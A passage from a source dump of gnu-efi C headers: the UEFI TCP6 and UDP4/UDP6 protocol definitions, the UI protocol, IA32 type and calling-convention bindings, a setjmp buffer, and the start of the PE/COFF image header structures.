    EFI_TCP4_CONFIGURE     Configure;
    EFI_TCP4_ROUTES        Routes;
    EFI_TCP4_CONNECT       Connect;
    EFI_TCP4_ACCEPT        Accept;
    EFI_TCP4_TRANSMIT      Transmit;
    EFI_TCP4_RECEIVE       Receive;
    EFI_TCP4_CLOSE         Close;
    EFI_TCP4_CANCEL        Cancel;
    EFI_TCP4_POLL          Poll;
} EFI_TCP4;

typedef enum {
    Tcp6StateClosed      = 0,
    Tcp6StateListen      = 1,
    Tcp6StateSynSent     = 2,
    Tcp6StateSynReceived = 3,
    Tcp6StateEstablished = 4,
    Tcp6StateFinWait1    = 5,
    Tcp6StateFinWait2    = 6,
    Tcp6StateClosing     = 7,
    Tcp6StateTimeWait    = 8,
    Tcp6StateCloseWait   = 9,
    Tcp6StateLastAck     = 10
} EFI_TCP6_CONNECTION_STATE;

typedef struct {
    EFI_IPv6_ADDRESS StationAddress;
    UINT16           StationPort;
    EFI_IPv6_ADDRESS RemoteAddress;
    UINT16           RemotePort;
    BOOLEAN          ActiveFlag;
} EFI_TCP6_ACCESS_POINT;

typedef struct {
    UINT32             ReceiveBufferSize;
    UINT32             SendBufferSize;
    UINT32             MaxSynBackLog;
    UINT32             ConnectionTimeout;
    UINT32             DataRetries;
    UINT32             FinTimeout;
    UINT32             TimeWaitTimeout;
    UINT32             KeepAliveProbes;
    UINT32             KeepAliveTime;
    UINT32             KeepAliveInterval;
    BOOLEAN            EnableNagle;
    BOOLEAN            EnableTimeStamp;
    BOOLEAN            EnableWindbowScaling;
    BOOLEAN            EnableSelectiveAck;
    BOOLEAN            EnablePathMtuDiscovery;
} EFI_TCP6_OPTION;

typedef struct {
    UINT8                 TrafficClass;
    UINT8                 HopLimit;
    EFI_TCP6_ACCESS_POINT AccessPoint;
    EFI_TCP6_OPTION       *ControlOption;
} EFI_TCP6_CONFIG_DATA;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_GET_MODE_DATA) (
    IN struct _EFI_TCP6                 *This,
    OUT EFI_TCP6_CONNECTION_STATE       *Tcp6State      OPTIONAL,
    OUT EFI_TCP6_CONFIG_DATA            *Tcp6ConfigData OPTIONAL,
    OUT EFI_IP6_MODE_DATA               *Ip6ModeData    OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData  OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData    OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_CONFIGURE) (
    IN struct _EFI_TCP6     *This,
    IN EFI_TCP6_CONFIG_DATA *Tcp6ConfigData OPTIONAL
    );

typedef struct {
    EFI_EVENT  Event;
    EFI_STATUS Status;
} EFI_TCP6_COMPLETION_TOKEN;

typedef struct {
    EFI_TCP6_COMPLETION_TOKEN CompletionToken;
} EFI_TCP6_CONNECTION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_CONNECT) (
    IN struct _EFI_TCP6          *This,
    IN EFI_TCP6_CONNECTION_TOKEN *ConnectionToken
    );

typedef struct {
    EFI_TCP6_COMPLETION_TOKEN CompletionToken;
    EFI_HANDLE                NewChildHandle;
} EFI_TCP6_LISTEN_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_ACCEPT) (
    IN struct _EFI_TCP6      *This,
    IN EFI_TCP6_LISTEN_TOKEN *ListenToken
    );

typedef struct {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_TCP6_FRAGMENT_DATA;

typedef struct {
    BOOLEAN                UrgentFlag;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_TCP6_FRAGMENT_DATA FragmentTable[1];
} EFI_TCP6_RECEIVE_DATA;

typedef struct {
    BOOLEAN                Push;
    BOOLEAN                Urgent;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_TCP6_FRAGMENT_DATA FragmentTable[1];
} EFI_TCP6_TRANSMIT_DATA;

typedef struct {
    EFI_TCP6_COMPLETION_TOKEN  CompletionToken;
    union {
	EFI_TCP6_RECEIVE_DATA  *RxData;
	EFI_TCP6_TRANSMIT_DATA *TxData;
    }                          Packet;
} EFI_TCP6_IO_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_TRANSMIT) (
    IN struct _EFI_TCP6  *This,
    IN EFI_TCP6_IO_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_RECEIVE) (
    IN struct _EFI_TCP6  *This,
    IN EFI_TCP6_IO_TOKEN *Token
    );

typedef struct {
    EFI_TCP6_COMPLETION_TOKEN CompletionToken;
    BOOLEAN                   AbortOnClose;
} EFI_TCP6_CLOSE_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_CLOSE)(
    IN struct _EFI_TCP6     *This,
    IN EFI_TCP6_CLOSE_TOKEN *CloseToken
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_CANCEL)(
    IN struct _EFI_TCP6          *This,
    IN EFI_TCP6_COMPLETION_TOKEN *Token OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TCP6_POLL) (
    IN struct _EFI_TCP6 *This
    );

typedef struct _EFI_TCP6 {
    EFI_TCP6_GET_MODE_DATA GetModeData;
    EFI_TCP6_CONFIGURE     Configure;
    EFI_TCP6_CONNECT       Connect;
    EFI_TCP6_ACCEPT        Accept;
    EFI_TCP6_TRANSMIT      Transmit;
    EFI_TCP6_RECEIVE       Receive;
    EFI_TCP6_CLOSE         Close;
    EFI_TCP6_CANCEL        Cancel;
    EFI_TCP6_POLL          Poll;
} EFI_TCP6;

#endif /* _EFI_TCP_H */

```

`include/gnu-efi/efiudp.h`:

```h
#ifndef _EFI_UDP_H
#define _EFI_UDP_H


/*++
Copyright (c) 2013  Intel Corporation

--*/

#define EFI_UDP4_SERVICE_BINDING_PROTOCOL \
    { 0x83f01464, 0x99bd, 0x45e5, {0xb3, 0x83, 0xaf, 0x63, 0x05, 0xd8, 0xe9, 0xe6} }

#define EFI_UDP4_PROTOCOL \
    { 0x3ad9df29, 0x4501, 0x478d, {0xb1, 0xf8, 0x7f, 0x7f, 0xe7, 0x0e, 0x50, 0xf3} }

#define EFI_UDP6_SERVICE_BINDING_PROTOCOL \
    { 0x66ed4721, 0x3c98, 0x4d3e, {0x81, 0xe3, 0xd0, 0x3d, 0xd3, 0x9a, 0x72, 0x54} }

#define EFI_UDP6_PROTOCOL \
    { 0x4f948815, 0xb4b9, 0x43cb, {0x8a, 0x33, 0x90, 0xe0, 0x60, 0xb3,0x49, 0x55} }

INTERFACE_DECL(_EFI_UDP4);
INTERFACE_DECL(_EFI_UDP6);

typedef struct {
    BOOLEAN          AcceptBroadcast;
    BOOLEAN          AcceptPromiscuous;
    BOOLEAN          AcceptAnyPort;
    BOOLEAN          AllowDuplicatePort;
    UINT8            TypeOfService;
    UINT8            TimeToLive;
    BOOLEAN          DoNotFragment;
    UINT32           ReceiveTimeout;
    UINT32           TransmitTimeout;
    BOOLEAN          UseDefaultAddress;
    EFI_IPv4_ADDRESS StationAddress;
    EFI_IPv4_ADDRESS SubnetMask;
    UINT16           StationPort;
    EFI_IPv4_ADDRESS RemoteAddress;
    UINT16           RemotePort;
} EFI_UDP4_CONFIG_DATA;

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_GET_MODE_DATA) (
    IN struct _EFI_UDP4                 *This,
    OUT EFI_UDP4_CONFIG_DATA            *Udp4ConfigData OPTIONAL,
    OUT EFI_IP4_MODE_DATA               *Ip4ModeData    OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData  OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData    OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_CONFIGURE) (
    IN struct _EFI_UDP4     *This,
    IN EFI_UDP4_CONFIG_DATA *UdpConfigData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_GROUPS) (
    IN struct _EFI_UDP4 *This,
    IN BOOLEAN          JoinFlag,
    IN EFI_IPv4_ADDRESS *MulticastAddress OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_ROUTES) (
    IN struct _EFI_UDP4 *This,
    IN BOOLEAN          DeleteRoute,
    IN EFI_IPv4_ADDRESS *SubnetAddress,
    IN EFI_IPv4_ADDRESS *SubnetMask,
    IN EFI_IPv4_ADDRESS *GatewayAddress
    );

#define EFI_NETWORK_UNREACHABLE  EFIERR(100)
#define EFI_HOST_UNREACHABLE     EFIERR(101)
#define EFI_PROTOCOL_UNREACHABLE EFIERR(102)
#define EFI_PORT_UNREACHABLE     EFIERR(103)

typedef struct {
    EFI_IPv4_ADDRESS SourceAddress;
    UINT16           SourcePort;
    EFI_IPv4_ADDRESS DestinationAddress;
    UINT16           DestinationPort;
} EFI_UDP4_SESSION_DATA;

typedef struct {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_UDP4_FRAGMENT_DATA;

typedef struct {
    EFI_TIME               TimeStamp;
    EFI_EVENT              RecycleSignal;
    EFI_UDP4_SESSION_DATA  UdpSession;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_UDP4_FRAGMENT_DATA FragmentTable[1];
} EFI_UDP4_RECEIVE_DATA;

typedef struct {
    EFI_UDP4_SESSION_DATA  *UdpSessionData;
    EFI_IPv4_ADDRESS       *GatewayAddress;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_UDP4_FRAGMENT_DATA FragmentTable[1];
} EFI_UDP4_TRANSMIT_DATA;

typedef struct {
    EFI_EVENT                  Event;
    EFI_STATUS                 Status;
    union {
        EFI_UDP4_RECEIVE_DATA  *RxData;
	EFI_UDP4_TRANSMIT_DATA *TxData;
    }                          Packet;
} EFI_UDP4_COMPLETION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_TRANSMIT) (
    IN struct _EFI_UDP4          *This,
    IN EFI_UDP4_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_RECEIVE) (
    IN struct _EFI_UDP4          *This,
    IN EFI_UDP4_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_CANCEL)(
    IN struct _EFI_UDP4          *This,
    IN EFI_UDP4_COMPLETION_TOKEN *Token OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP4_POLL) (
    IN struct _EFI_UDP4 *This
    );

typedef struct _EFI_UDP4 {
    EFI_UDP4_GET_MODE_DATA GetModeData;
    EFI_UDP4_CONFIGURE     Configure;
    EFI_UDP4_GROUPS        Groups;
    EFI_UDP4_ROUTES        Routes;
    EFI_UDP4_TRANSMIT      Transmit;
    EFI_UDP4_RECEIVE       Receive;
    EFI_UDP4_CANCEL        Cancel;
    EFI_UDP4_POLL          Poll;
} EFI_UDP4;

typedef struct {
    BOOLEAN          AcceptPromiscuous;
    BOOLEAN          AcceptAnyPort;
    BOOLEAN          AllowDuplicatePort;
    UINT8            TrafficClass;
    UINT8            HopLimit;
    UINT32           ReceiveTimeout;
    UINT32           TransmitTimeout;
    EFI_IPv6_ADDRESS StationAddress;
    UINT16           StationPort;
    EFI_IPv6_ADDRESS RemoteAddress;
    UINT16           RemotePort;
} EFI_UDP6_CONFIG_DATA;

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_GET_MODE_DATA) (
    IN struct _EFI_UDP6                 *This,
    OUT EFI_UDP6_CONFIG_DATA            *Udp6ConfigData OPTIONAL,
    OUT EFI_IP6_MODE_DATA               *Ip6ModeData    OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData  OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData    OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_CONFIGURE) (
    IN struct _EFI_UDP6     *This,
    IN EFI_UDP6_CONFIG_DATA *UdpConfigData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_GROUPS) (
    IN struct _EFI_UDP6 *This,
    IN BOOLEAN          JoinFlag,
    IN EFI_IPv6_ADDRESS *MulticastAddress OPTIONAL
    );

typedef struct {
    EFI_IPv6_ADDRESS SourceAddress;
    UINT16           SourcePort;
    EFI_IPv6_ADDRESS DestinationAddress;
    UINT16           DestinationPort;
} EFI_UDP6_SESSION_DATA;

typedef struct {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_UDP6_FRAGMENT_DATA;

typedef struct {
    EFI_TIME               TimeStamp;
    EFI_EVENT              RecycleSignal;
    EFI_UDP6_SESSION_DATA  UdpSession;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_UDP6_FRAGMENT_DATA FragmentTable[1];
} EFI_UDP6_RECEIVE_DATA;

typedef struct {
    EFI_UDP6_SESSION_DATA  *UdpSessionData;
    UINT32                 DataLength;
    UINT32                 FragmentCount;
    EFI_UDP6_FRAGMENT_DATA FragmentTable[1];
} EFI_UDP6_TRANSMIT_DATA;

typedef struct {
    EFI_EVENT                  Event;
    EFI_STATUS                 Status;
    union {
        EFI_UDP6_RECEIVE_DATA  *RxData;
        EFI_UDP6_TRANSMIT_DATA *TxData;
    }                          Packet;
} EFI_UDP6_COMPLETION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_TRANSMIT) (
    IN struct _EFI_UDP6          *This,
    IN EFI_UDP6_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_RECEIVE) (
    IN struct _EFI_UDP6          *This,
    IN EFI_UDP6_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_CANCEL)(
    IN struct _EFI_UDP6          *This,
    IN EFI_UDP6_COMPLETION_TOKEN *Token OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UDP6_POLL) (
    IN struct _EFI_UDP6 *This
    );

typedef struct _EFI_UDP6 {
    EFI_UDP6_GET_MODE_DATA GetModeData;
    EFI_UDP6_CONFIGURE     Configure;
    EFI_UDP6_GROUPS        Groups;
    EFI_UDP6_TRANSMIT      Transmit;
    EFI_UDP6_RECEIVE       Receive;
    EFI_UDP6_CANCEL        Cancel;
    EFI_UDP6_POLL          Poll;
} EFI_UDP6;

#endif /* _EFI_UDP_H */

```

`include/gnu-efi/efiui.h`:

```h
#ifndef _EFI_UI_H
#define _EFI_UI_H

/*++

Copyright (c) 200  Intel Corporation

Module Name:

    EfiUi.h

Abstract:
    Protocol used to build User Interface (UI) stuff.

    This protocol is just data. It is a multi dimentional array.
    For each string there is an array of UI_STRING_ENTRY. Each string
    is for a different language translation of the same string. The list
    is terminated by a NULL UiString. There can be any number of
    UI_STRING_ENTRY arrays. A NULL array terminates the list. A NULL array
    entry contains all zeros.

    Thus the shortest possible EFI_UI_PROTOCOL has three UI_STRING_ENTRY.
    The String, it's NULL terminator, and the NULL terminator for the entire
    thing.


Revision History

--*/

#define EFI_UI_INTERFACE_PROTOCOL_GUID \
    { 0x32dd7981, 0x2d27, 0x11d4, {0xbc, 0x8b, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81} }
#define EFI_UI_PROTOCOL EFI_UI_INTERFACE_PROTOCOL_GUID


typedef enum {
    UiDeviceString,
    UiVendorString,
    UiMaxString
} UI_STRING_TYPE;

typedef struct {
    ISO_639_2   *LangCode;
    CHAR16      *UiString;
} UI_STRING_ENTRY;

#define EFI_UI_INTERFACE_PROTOCOL_VERSION 0x00010000
#define EFI_UI_VERSION                    EFI_UI_INTERFACE_PROTOCOL_VERSION

typedef struct _EFI_UI_INTERFACE_PROTOCOL {
    UINT32          Version;
    UI_STRING_ENTRY *Entry;
} EFI_UI_INTERFACE_PROTOCOL;

typedef struct _EFI_UI_INTERFACE_PROTOCOL _UI_INTERFACE;
typedef EFI_UI_INTERFACE_PROTOCOL UI_INTERFACE;

#endif

```

`include/gnu-efi/ia32/efibind.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efefind.h

Abstract:

    EFI to compile bindings




Revision History

--*/

#ifndef __GNUC__
#pragma pack()
#endif

//
// Basic int types of various widths
//

#if !defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L ) && !defined(__cplusplus)

    // No ANSI C 1999/2000 stdint.h integer width declarations 

    #if defined(_MSC_EXTENSIONS)

        // Use Microsoft C compiler integer width declarations 

        typedef unsigned __int64    uint64_t;
        typedef __int64             int64_t;
        typedef unsigned __int32    uint32_t;
        typedef __int32             int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef char                int8_t;
    #elif defined(__GNUC__)
        typedef int __attribute__((__mode__(__DI__)))           int64_t;
        typedef unsigned int __attribute__((__mode__(__DI__)))  uint64_t;
        typedef unsigned int        uint32_t;
        typedef int                 int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef signed char         int8_t;
    #elif defined(UNIX_LP64)

        /*  Use LP64 programming model from C_FLAGS for integer width declarations */

       typedef unsigned long       uint64_t;
       typedef long                int64_t;
       typedef unsigned int        uint32_t;
       typedef int                 int32_t;
       typedef unsigned short      uint16_t;
       typedef short               int16_t;
       typedef unsigned char       uint8_t;
       typedef char                int8_t;
    #else

       /*  Assume P64 programming model from C_FLAGS for integer width declarations */

       typedef unsigned long long  uint64_t __attribute__((aligned (8)));
       typedef long long           int64_t __attribute__((aligned (8)));
       typedef unsigned int        uint32_t;
       typedef int                 int32_t;
       typedef unsigned short      uint16_t;
       typedef short               int16_t;
       typedef unsigned char       uint8_t;
       typedef char                int8_t;
    #endif
    typedef uint32_t            uintptr_t;
    typedef int32_t             intptr_t;
#elif defined(__GNUC__)
    #include <stdint.h>
#endif

//
// Basic EFI types of various widths
//

#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__ short
#endif

typedef uint64_t   UINT64;
typedef int64_t    INT64;

#ifndef _BASETSD_H_
    typedef uint32_t   UINT32;
    typedef int32_t    INT32;
#endif

typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;

#undef VOID
#define VOID    void


typedef int32_t    INTN;
typedef uint32_t   UINTN;

#ifdef EFI_NT_EMULATOR
    #define POST_CODE(_Data)
#else    
    #ifdef EFI_DEBUG
#define POST_CODE(_Data)    __asm mov eax,(_Data) __asm out 0x80,al
    #else
        #define POST_CODE(_Data)
    #endif  
#endif

#define EFIERR(a)           (0x80000000 | a)
#define EFI_ERROR_MASK      0x80000000
#define EFIERR_OEM(a)       (0xc0000000 | a)      


#define BAD_POINTER         0xFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFF

#ifdef EFI_NT_EMULATOR
    #define BREAKPOINT()        __asm { int 3 }
#else
    #define BREAKPOINT()        while (TRUE);    // Make it hang on Bios[Dbg]32
#endif

//
// Pointers must be aligned to these address to function
//

#define MIN_ALIGNMENT_SIZE  4

#define ALIGN_VARIABLE(Value ,Adjustment) \
            (UINTN)Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment


//
// Define macros to build data structure signatures from characters.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))
//
// To export & import functions in the EFI emulator environment
//

#ifdef EFI_NT_EMULATOR
    #define EXPORTAPI           __declspec( dllexport )
#else
    #define EXPORTAPI
#endif


//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code    
//

#ifndef EFIAPI                  // Forces EFI calling conventions reguardless of compiler options 
    #ifdef _MSC_EXTENSIONS
        #define EFIAPI __cdecl  // Force C calling convention for Microsoft C compiler 
    #else
        #define EFIAPI          // Substitute expresion to force C calling convention 
    #endif
#endif

#define BOOTSERVICE
//#define RUNTIMESERVICE(proto,a)    alloc_text("rtcode",a); proto a
//#define RUNTIMEFUNCTION(proto,a)   alloc_text("rtcode",a); proto a
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION


#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE    volatile

#define MEMORY_FENCE()    

#ifdef EFI_NT_EMULATOR

//
// To help ensure proper coding of integrated drivers, they are
// compiled as DLLs.  In NT they require a dll init entry pointer.
// The macro puts a stub entry point into the DLL so it will load.
//

#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    __stdcall                                   \
    _DllMainCRTStartup (                        \
        UINTN    Inst,                          \
        UINTN    reason_for_call,               \
        VOID    *rserved                        \
        )                                       \
    {                                           \
        return 1;                               \
    }                                           \
                                                \
    int                                         \
    EXPORTAPI                                   \
    __cdecl                                     \
    InitializeDriver (                          \
        void *ImageHandle,                      \
        void *SystemTable                       \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle, SystemTable);       \
    }


    #define LOAD_INTERNAL_DRIVER(_if, type, name, entry)      \
        (_if)->LoadInternal(type, name, NULL)             

#else // EFI_NT_EMULATOR 

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
    #define EFI_DRIVER_ENTRY_POINT(InitFunction) \
        __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
    #define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
        UINTN                                       \
        InitializeDriver (                          \
            VOID    *ImageHandle,                   \
            VOID    *SystemTable                    \
            )                                       \
        {                                           \
            return InitFunction(ImageHandle,        \
                    SystemTable);                   \
        }                                           \
                                                    \
        EFI_STATUS efi_main(                        \
            EFI_HANDLE image,                       \
            EFI_SYSTEM_TABLE *systab                \
            ) __attribute__((weak,                  \
                    alias ("InitializeDriver")));
#endif

    #define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
            (_if)->LoadInternal(type, name, entry)

#endif // EFI_FW_NT 

//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.
//
#ifdef NO_INTERFACE_DECL
#define INTERFACE_DECL(x)
#else
#if defined(__GNUC__) || defined(_MSC_EXTENSIONS)
#define INTERFACE_DECL(x) struct x
#else
#define INTERFACE_DECL(x) typedef struct x
#endif
#endif

/* No efi call wrapper for IA32 architecture */
#define uefi_call_wrapper(func, va_num, ...)	func(__VA_ARGS__)
#define EFI_FUNCTION

#ifdef _MSC_EXTENSIONS
#pragma warning ( disable : 4731 )  // Suppress warnings about modification of EBP
#endif


```

`include/gnu-efi/ia32/efilibplat.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings




Revision History

--*/

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );

   

```

`include/gnu-efi/ia32/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_IA32_SETJMP_H
#define GNU_EFI_IA32_SETJMP_H

#define JMPBUF_ALIGN 4

typedef struct {
	UINT32	Ebx;
	UINT32	Esi;
	UINT32	Edi;
	UINT32	Ebp;
	UINT32	Esp;
	UINT32	Eip;
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_IA32_SETJMP_H */

```

`include/gnu-efi/ia32/pe.h`:

```h
/* 
    PE32+ header file
 */
#ifndef _PE_H
#define _PE_H

#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_OS2_SIGNATURE                 0x454E      // NE
#define IMAGE_OS2_SIGNATURE_LE              0x454C      // LE
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00  
#define IMAGE_EDOS_SIGNATURE                0x44454550  // PEED


typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    UINT16   e_magic;                     // Magic number
    UINT16   e_cblp;                      // Bytes on last page of file
    UINT16   e_cp;                        // Pages in file
    UINT16   e_crlc;                      // Relocations
    UINT16   e_cparhdr;                   // Size of header in paragraphs
    UINT16   e_minalloc;                  // Minimum extra paragraphs needed
    UINT16   e_maxalloc;                  // Maximum extra paragraphs needed
    UINT16   e_ss;                        // Initial (relative) SS value
    UINT16   e_sp;                        // Initial SP value
    UINT16   e_csum;                      // Checksum
    UINT16   e_ip;                        // Initial IP value
    UINT16   e_cs;                        // Initial (relative) CS value
    UINT16   e_lfarlc;                    // File address of relocation table
    UINT16   e_ovno;                      // Overlay number
    UINT16   e_res[4];                    // Reserved words
    UINT16   e_oemid;                     // OEM identifier (for e_oeminfo)
    UINT16   e_oeminfo;                   // OEM information; e_oemid specific
    UINT16   e_res2[10];                  // Reserved words
    UINT32   e_lfanew;                    // File address of new exe header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_OS2_HEADER {      // OS/2 .EXE header
    UINT16   ne_magic;                    // Magic number
    UINT8    ne_ver;                      // Version number
    UINT8    ne_rev;                      // Revision number
    UINT16   ne_enttab;                   // Offset of Entry Table
    UINT16   ne_cbenttab;                 // Number of bytes in Entry Table
    UINT32   ne_crc;                      // Checksum of whole file
    UINT16   ne_flags;                    // Flag UINT16
    UINT16   ne_autodata;                 // Automatic data segment number
    UINT16   ne_heap;                     // Initial heap allocation
    UINT16   ne_stack;                    // Initial stack allocation
    UINT32   ne_csip;                     // Initial CS:IP setting
    UINT32   ne_sssp;                     // Initial SS:SP setting
    UINT16   ne_cseg;                     // Count of file segments
    UINT16   ne_cmod;                     // Entries in Module Reference Table
    UINT16   ne_cbnrestab;                // Size of non-resident name table
    UINT16   ne_segtab;                   // Offset of Segment Table
    UINT16   ne_rsrctab;                  // Offset of Resource Table
    UINT16   ne_restab;                   // Offset of resident name table
    UINT16   ne_modtab;                   // Offset of Module Reference Table
    UINT16   ne_imptab;                   // Offset of Imported Names Table
    UINT32   ne_nrestab;                  // Offset of Non-resident Names Table
    UINT16   ne_cmovent;                  // Count of movable entries
    UINT16   ne_align;                    // Segment alignment shift count
    UINT16   ne_cres;                     // Count of resource segments
    UINT8    ne_exetyp;                   // Target Operating system
    UINT8    ne_flagsothers;              // Other .EXE flags
    UINT16   ne_pretthunks;               // offset to return thunks
    UINT16   ne_psegrefbytes;             // offset to segment ref. bytes
    UINT16   ne_swaparea;                 // Minimum code swap area size
    UINT16   ne_expver;                   // Expected Windows version number
  } IMAGE_OS2_HEADER, *PIMAGE_OS2_HEADER;

//
// File header format.
//

typedef struct _IMAGE_FILE_HEADER {
    UINT16   Machine;
    UINT16   NumberOfSections;
    UINT32   TimeDateStamp;
    UINT32   PointerToSymbolTable;
    UINT32   NumberOfSymbols;
    UINT16   SizeOfOptionalHeader;
    UINT16   Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

#define IMAGE_SIZEOF_FILE_HEADER             20

#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.
#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).
#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.
#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.
#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.
#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file
#define IMAGE_FILE_SYSTEM                    0x1000  // System File.
#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.
#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.

#define IMAGE_FILE_MACHINE_UNKNOWN           0
#define IMAGE_FILE_MACHINE_I386              0x14c   // Intel 386.
#define IMAGE_FILE_MACHINE_R3000             0x162   // MIPS little-endian, 0540 big-endian
#define IMAGE_FILE_MACHINE_R4000             0x166   // MIPS little-endian
#define IMAGE_FILE_MACHINE_ALPHA             0x184   // Alpha_AXP
#define IMAGE_FILE_MACHINE_ARMTHUMB_MIXED    0x1c2   // Arm/Thumb
#define IMAGE_FILE_MACHINE_POWERPC           0x1F0   // IBM PowerPC Little-Endian
#define IMAGE_FILE_MACHINE_IA64              0x200   // IA-64
#define IMAGE_FILE_MACHINE_TAHOE             0x7cc   // Intel EM machine
#define IMAGE_FILE_MACHINE_EBC               0xebc   // EFI Byte Code
#define IMAGE_FILE_MACHINE_X64               0x8664  // x86_64
//
// Directory format.
//

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32   VirtualAddress;
    UINT32   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16

//
// Optional header format.
//

typedef struct _IMAGE_OPTIONAL_HEADER {
    //
